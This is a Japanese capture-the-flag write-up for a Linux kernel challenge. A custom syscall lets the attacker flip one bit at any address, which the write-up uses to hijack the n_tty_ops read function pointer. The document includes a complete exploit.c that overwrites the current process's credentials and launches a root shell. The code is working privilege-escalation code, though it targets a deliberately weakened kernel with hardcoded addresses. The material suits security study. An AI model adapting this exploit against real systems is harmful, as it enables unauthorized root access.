keywords
baby / kernel exploitation / n_tty_ops

# static
## basic
```basic.sh
/ # cat /proc/version
Linux version 4.17.0 (aleph@codin) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.9)) #1 Fri J8

  -append "nokaslr root=/dev/ram rw console=ttyS0 oops=panic paneic=1 quiet" 2>/dev/null \
```
SMEP無効・SMAP無効・KASLR無効・oops->panic

## new syscall
新しくsyscallが追加されている。
```flitbip.c
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/syscalls.h>

#define MAXFLIT 1

#ifndef __NR_FLITBIP
#define FLITBIP 333
#endif

long flit_count = 0;
EXPORT_SYMBOL(flit_count);

SYSCALL_DEFINE2(flitbip, long *, addr, long, bit)
{
        if (flit_count >= MAXFLIT)
        {
                printk(KERN_INFO "flitbip: sorry :/\n");
                return -EPERM;
        }

        *addr ^= (1ULL << (bit));
        flit_count++;

        return 0;
}
```
任意のアドレスの任意のbitを反転させることができる。`flist_count`によって回数を制限しているが、KASLR無いから`flist_count`を最初に反転させることで任意回ビット反転ができる。

# get RIP
任意アドレスに任意の値を書き込むことができる状況である。しかもSMEPが無効のため、RIPさえ取れればそれだけで終わる。このような場合には、`struct tty_ldisc_ops n_tty_ops`を書き換えるのが便利らしい。これはTTY関連の関数テーブルで、新規ターミナルのデフォルトテーブルとして利用され、且つRWになっているもの。
```ex.c
# 構造体
static struct tty_ldisc_ops n_tty_ops = {
	.magic           = TTY_LDISC_MAGIC,
	.name            = "n_tty",
	.open            = n_tty_open,
	.close           = n_tty_close,
	.flush_buffer    = n_tty_flush_buffer,
	.read            = n_tty_read,
	.write           = n_tty_write,
	.ioctl           = n_tty_ioctl,
	.set_termios     = n_tty_set_termios,
	.poll            = n_tty_poll,
	.receive_buf     = n_tty_receive_buf,
	.write_wakeup    = n_tty_write_wakeup,
	.receive_buf2	 = n_tty_receive_buf2,
};
# 初期化
static int __init pps_tty_init(void)
{
	int err;

	/* Inherit the N_TTY's ops */
	n_tty_inherit_ops(&pps_ldisc_ops);
(snipped)
```
というわけで、こいつの`read`を書き換えて`scanf()`なり`gets()`なりを呼ぶことでRIPが取れる。

# LPE
あとは、用意したshellcodeを踏ませれば終わり。KASLR無効より`current`の場所が分かるため直接`current->cred.uid`等をNULLクリアする。

# exploit
```exploit.c
#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <linux/prctl.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>


// commands
#define DEV_PATH ""   // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
// (END globals)


// utils
#define WAIT getc(stdin);
#define ulong unsigned long
#define scu static const unsigned long
#define NULL (void*)0
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) errExit("KMALLOC");}
ulong user_cs,user_ss,user_sp,user_rflags;
struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
  ulong sp; ulong ss;
};
void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}
void NIRUGIRI(void)
{
  setreuid(0, 0);
  char *argv[] = {"/bin/sh",NULL};
  char *envp[] = {NULL};
  execve("/bin/sh",argv,envp);
}
// should compile with -masm=intel
static void save_state(void) {
  asm(
      "movq %0, %%cs\n"
      "movq %1, %%ss\n"
      "movq %2, %%rsp\n"
      "pushfq\n"
      "popq %3\n"
      : "=r" (user_cs), "=r" (user_ss), "=r"(user_sp), "=r" (user_rflags) : : "memory" 		);
}

const ulong n_tty_ops_read = 0xffffffff8183e320 + 0x30;
const ulong n_tty_read = 0xffffffff810c8510;

static void shellcode(void){
  // まずはお直し
  *((ulong*)n_tty_ops_read) = n_tty_read;

  // そのあとpwn
  scu current_task = 0xffffffff8182e040;
  scu cred = current_task + 0x3c0;
  for(int ix=0; ix!=3; ++ix)
    ((uint *)cred)[ix] = 0;
  asm(
    "swapgs\n"
    "mov %%rax, %0\n"
    "push %%rax\n"
    "mov %%rax, %1\n"
    "push %%rax\n"
    "mov %%rax, %2\n"
    "push %%rax\n"
    "mov %%rax, %3\n"
    "push %%rax\n"
    "mov %%rax, %4\n"
    "push %%rax\n"
    "iretq\n"
    :: "r" (user_ss), "r" (user_sp), "r"(user_rflags), "r" (user_cs), "r" (&NIRUGIRI) : "memory"
  );
}
// (END utils)

// flitbip
const ulong flit_count = 0xffffffff818f4f78;

long _fff(long *addr, long bit){
  asm(
      "mov rax, 333\n"
      "syscall\n"
  );
}
long fff(long *addr, long bit){
  long tmp = _fff(addr, bit);
  assert(tmp == 0);
  return tmp;
}
// (END flitbip)

int main(int argc, char *argv[]) {
  save_state();
  int pid = getpid();
  printf("[+] my pid: %lx\n", pid);

  char buf[0x200];
  printf("[+] shellcode @ %p\n", shellcode);
  ulong flipper = n_tty_read ^ (ulong)&shellcode;
  fff(flit_count, 63);

  for(int ix=0; ix!=64; ++ix){
    if(flipper & 1 == 1){
      fff(n_tty_ops_read, ix);
    }
    flipper >>= 1;
  }

  fgets(buf, sizeof(buf), stdin);

  printf("[!] unreachable\n");
  return 0;
}
```


# アウトロ
違う、こういう問題を解きたいんじゃない。。。。。。。。。。。
次からは簡単過ぎる問題は飛ばして良さげな問題だけ見繕おうと思います。


# 参考
ニルギリ
https://youtu.be/yvUvamhYPHw
